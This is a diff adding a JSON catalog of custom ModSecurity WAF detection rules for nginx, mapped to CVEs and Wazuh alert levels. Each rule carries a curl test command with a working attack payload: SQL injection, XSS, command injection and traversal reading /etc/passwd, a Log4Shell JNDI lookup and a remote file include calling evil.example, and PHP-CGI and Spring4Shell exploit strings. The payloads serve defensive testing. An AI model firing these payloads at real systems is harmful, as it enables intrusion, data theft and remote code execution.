@@ -1,0 +1,161 @@
+{
+  "catalog": "GROOT_A_WAF",
+  "version": "1.0.0",
+  "date": "2026-10-02",
+  "engine": "ModSecurity v3 (libmodsecurity) + ModSecurity-nginx",
+  "baseline": "OWASP CRS 4.29.0",
+  "mode": "DetectionOnly",
+  "rule_file": "/etc/nginx/modsec/GROOT_A_WAF.conf",
+  "audit_log": "/var/log/modsec/modsec_audit.json",
+  "id_ranges": {
+    "helpers": "10000-10099",
+    "WAF-HDR": "10100-10199",
+    "WAF-SQLI": "10200-10299",
+    "WAF-XSS": "10300-10399",
+    "WAF-RCE": "10400-10499",
+    "WAF-LFI_RFI": "10500-10599",
+    "WAF-CVE": "10600-10699"
+  },
+  "priority_map": {
+    "high":   { "modsec_severity": "CRITICAL", "crs_score": 5, "tag": "GROOT_A/priority/high",   "wazuh_level": 12 },
+    "medium": { "modsec_severity": "WARNING",  "crs_score": 3, "tag": "GROOT_A/priority/medium", "wazuh_level": 8 },
+    "low":    { "modsec_severity": "NOTICE",   "crs_score": 2, "tag": "GROOT_A/priority/low",    "wazuh_level": 5 }
+  },
+  "rules": [
+    {
+      "id": 10100,
+      "label": "WAF-HDR-001",
+      "priority": "medium",
+      "category": "header-manipulation",
+      "phase": 1,
+      "targets": ["REQUEST_HEADERS:X-Forwarded-For"],
+      "description": "X-Forwarded-For is not a comma-separated list of IP addresses. Catches log poisoning and injection smuggled through XFF.",
+      "cves": [],
+      "capec": "capec/1000/210/272",
+      "test": "curl -s -H 'X-Forwarded-For: 1.2.3.4, <script>' http://TARGET/",
+      "notes": "No decoding transformations on purpose; header must be well-formed as sent."
+    },
+    {
+      "id": 10101,
+      "label": "WAF-HDR-002",
+      "priority": "low",
+      "category": "header-manipulation",
+      "phase": 1,
+      "targets": ["REQUEST_HEADERS:X-Forwarded-For"],
+      "description": "First X-Forwarded-For value claims a loopback, private or link-local address (IP allowlist bypass attempt).",
+      "cves": [],
+      "capec": "capec/1000/210/272",
+      "test": "curl -s -H 'X-Forwarded-For: 127.0.0.1' http://TARGET/",
+      "notes": "Assumes nginx is the first hop. Re-scope if a trusted load balancer is added in front."
+    },
+    {
+      "id": 10200,
+      "label": "WAF-SQLI-001",
+      "priority": "high",
+      "category": "sqli",
+      "phase": 2,
+      "targets": ["ARGS", "ARGS_NAMES", "REQUEST_COOKIES", "REQUEST_HEADERS:User-Agent", "REQUEST_HEADERS:Referer", "REQUEST_HEADERS:X-Forwarded-For", "XML:/*"],
+      "description": "UNION-based, time-based (sleep/benchmark/pg_sleep/waitfor), file access (load_file/outfile) and stacked execution (xp_cmdshell) SQL injection.",
+      "cves": [],
+      "capec": "capec/1000/152/248/66",
+      "test": "curl -s \"http://TARGET/vulnerabilities/sqli/?id=1'%20UNION%20SELECT%20user,password%20FROM%20users%23&Submit=Submit\"",
+      "notes": "Chained: @pm prefilter then @rx. Complements CRS 942xxx with a dedicated WAF label."
+    },
+    {
+      "id": 10300,
+      "label": "WAF-XSS-001",
+      "priority": "high",
+      "category": "xss",
+      "phase": 2,
+      "targets": ["ARGS", "ARGS_NAMES", "REQUEST_COOKIES", "REQUEST_HEADERS:User-Agent", "REQUEST_HEADERS:Referer", "XML:/*"],
+      "description": "Script tags, inline event handlers on HTML elements, javascript: URIs, srcdoc attributes.",
+      "cves": [],
+      "capec": "capec/1000/152/242",
+      "test": "curl -s \"http://TARGET/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E\"",
+      "notes": "Chained: @pm prefilter then @rx. DVWA accepts no legitimate HTML input."
+    },
+    {
+      "id": 10400,
+      "label": "WAF-RCE-001",
+      "priority": "high",
+      "category": "rce",
+      "phase": 2,
+      "targets": ["ARGS", "ARGS_NAMES", "REQUEST_COOKIES", "REQUEST_HEADERS:User-Agent", "REQUEST_HEADERS:X-Forwarded-For", "XML:/*"],
+      "description": "OS command injection: shell metacharacter or substitution followed by a known binary.",
+      "cves": [],
+      "capec": "capec/1000/152/248/88",
+      "test": "curl -s -d 'ip=127.0.0.1;cat /etc/passwd&Submit=Submit' http://TARGET/vulnerabilities/exec/",
+      "notes": "Anchored on the metacharacter so a bare word like cat does not fire. Never exclude ARGS:ip for DVWA."
+    },
+    {
+      "id": 10500,
+      "label": "WAF-LFI-001",
+      "priority": "high",
+      "category": "lfi",
+      "phase": 2,
+      "targets": ["ARGS", "ARGS_NAMES", "REQUEST_COOKIES", "REQUEST_URI", "REQUEST_HEADERS:Referer", "XML:/*"],
+      "description": "Directory traversal, PHP stream wrappers (php://, phar://, zip://, expect://) and sensitive file names.",
+      "cves": ["CVE-2021-41773", "CVE-2021-42013"],
+      "capec": "capec/1000/255/153/126",
+      "test": "curl -s \"http://TARGET/vulnerabilities/fi/?page=../../../../etc/passwd\"",
+      "notes": "Double URL decoding on purpose. normalisePath is not used because it would collapse the .. sequence."
+    },
+    {
+      "id": 10501,
+      "label": "WAF-RFI-001",
+      "priority": "medium",
+      "category": "rfi",
+      "phase": 2,
+      "targets": ["ARGS:page|file|filename|path|include|inc|template|tpl|doc|dir|lang|module|view|load|src|plugin|theme|layout"],
+      "description": "Remote URL supplied in a file-type parameter.",
+      "cves": [],
+      "capec": "capec/1000/152/175/253",
+      "test": "curl -s \"http://TARGET/vulnerabilities/fi/?page=http://evil.example/shell.txt\"",
+      "notes": "Generic url/redirect/next parameters excluded on purpose (SSRF / open redirect handled elsewhere)."
+    },
+    {
+      "id": 10600,
+      "label": "WAF-CVE-001",
+      "priority": "high",
+      "category": "rce",
+      "phase": 2,
+      "targets": ["REQUEST_HEADERS", "REQUEST_URI", "ARGS", "ARGS_NAMES", "REQUEST_COOKIES", "XML:/*"],
+      "description": "Log4Shell and Text4Shell: ${jndi: and lookup obfuscations, any nested ${ within 20 chars, script/dns/url prefixes.",
+      "cves": ["CVE-2021-44228", "CVE-2021-45046", "CVE-2022-42889"],
+      "capec": "capec/1000/152/137/6",
+      "test": "curl -s -H 'X-Forwarded-For: ${jndi:ldap://evil.example/a}' http://TARGET/",
+      "notes": "Complements CRS 944150; inspects every header including X-Forwarded-For."
+    },
+    {
+      "id": 10601,
+      "label": "WAF-CVE-002",
+      "priority": "high",
+      "category": "rce",
+      "phase": 1,
+      "targets": ["QUERY_STRING"],
+      "description": "PHP-CGI argument injection via soft hyphen (%AD) or literal -d / -s in the raw query string.",
+      "cves": ["CVE-2024-4577", "CVE-2012-1823"],
+      "capec": "capec/1000/152/137",
+      "test": "curl -s \"http://TARGET/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input\"",
+      "notes": "Raw query string, no decoding, so the %AD encoding is seen as sent. Tag GROOT_A/stack/php."
+    },
+    {
+      "id": 10602,
+      "label": "WAF-CVE-003",
+      "priority": "high",
+      "category": "rce",
+      "phase": 2,
+      "targets": ["ARGS_NAMES", "REQUEST_URI", "REQUEST_HEADERS:Content-Type"],
+      "description": "Java expression injection: Spring4Shell classLoader parameter names, Confluence and Struts OGNL.",
+      "cves": ["CVE-2022-22965", "CVE-2022-26134", "CVE-2017-5638"],
+      "capec": "capec/1000/152/137/6",
+      "test": "curl -s \"http://TARGET/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x\"",
+      "notes": "Tag GROOT_A/stack/java. Can be removed by tag while the backend is PHP-only."
+    }
+  ],
+  "wazuh": {
+    "localfile": { "log_format": "json", "location": "/var/log/modsec/modsec_audit.json", "label_source": "groot_a_waf" },
+    "rule_ids": { "base": 100200, "high": 100201, "medium": 100202, "low": 100203 },
+    "join_key": "transaction.client_ip"
+  }
+}
